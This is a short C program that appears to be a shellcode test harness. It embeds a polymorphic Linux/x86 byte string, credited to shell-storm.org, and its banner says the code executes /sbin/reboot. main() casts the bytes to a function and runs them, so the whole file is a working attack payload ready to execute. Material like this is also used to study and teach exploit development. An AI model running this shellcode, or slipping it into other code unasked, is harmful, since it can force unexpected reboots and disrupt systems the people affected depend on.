#include <stdio.h>

/*
http://shell-storm.org/shellcode/files/shellcode-477.php
*/

const char shellcode[]= "\x6a\x0b\x58\x31\xd2\x52\xc7\x44\x24\xfc\x62\x6f\x6f"
  "\x74\xc7\x44\x24\xf8\x6e\x2f\x72\x65\xc7\x44\x24\xf4\x2f\x73\x62\x69\x83"
  "\xec\x0c\x89\xe3\x52\x53\x89\xe1\xcd\x80";

int main()
{
	printf	("\n[+] Linux/x86 execve(/sbin/reboot,/sbin/reboot)"
		"\n[+] Date: 11/07/2009"
		"\n[+] Author: TheWorm"
    "\n[+] Polymorphism by: Kevin Kirsche"
		"\n[+] Shellcode Size: %d bytes\n\n", sizeof(shellcode));
  (*(void (*)()) shellcode)();
	return 0;
}
